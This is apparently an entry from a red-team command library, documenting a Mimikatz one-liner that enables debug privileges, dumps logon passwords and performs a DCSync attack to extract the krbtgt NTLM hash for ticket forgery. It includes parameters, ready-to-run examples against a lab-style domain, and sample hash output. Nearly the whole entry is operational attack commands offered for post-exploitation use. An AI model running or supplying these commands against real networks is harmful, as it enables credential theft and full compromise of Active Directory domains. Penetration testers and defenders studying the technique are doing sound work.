---
type: command
executor: cmd
data: >-
  mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::dcsync
  /domain:$_DOMAIN /user:krbtgt" exit
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - credential-access
  - kerberos
  - dcsync
verified: true
validated: true
---

# mimikatz-dcsync-krbtgt-hash

## Command

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::dcsync /domain:$_DOMAIN /user:krbtgt" exit
```

## Description

This command uses Mimikatz to escalate privileges and perform a DCSync attack specifically targeting the krbtgt user's NTLM hash from the Active Directory domain. It is used in post-exploitation to gather credentials for ticket forgery.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Fully qualified domain name (e.g., example.local) | Yes |
| privilege::debug | Enables debug privileges for LSASS access | Built-in |
| sekurlsa::logonpasswords | Dumps current logon credentials (optional for context) | No |
| lsadump::dcsync | Performs remote replication to extract user secrets | Built-in |
| /user:krbtgt | Targets the krbtgt account specifically | Yes |

## Examples

### Basic Usage

```cmd
mimikatz.exe "lsadump::dcsync /domain:dollarcorp.moneycorp.local /user:krbtgt" exit
```

### With Privilege Escalation

```cmd
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:dollarcorp.moneycorp.local /user:krbtgt" exit
```

## Expected Output

[*] User : krbtgt@DOLLARCORP.MONEYCORP.LOCAL
Hash NTLM: e4e47c8fc433c9e0f3b17ea74856ca6b

Success is indicated by the NTLM hash being displayed without access denied errors.

## Related

- [[procedures/Forge-AD-Trust-Ticket-with-Mimikatz]]
- [[tools/Mimikatz]]
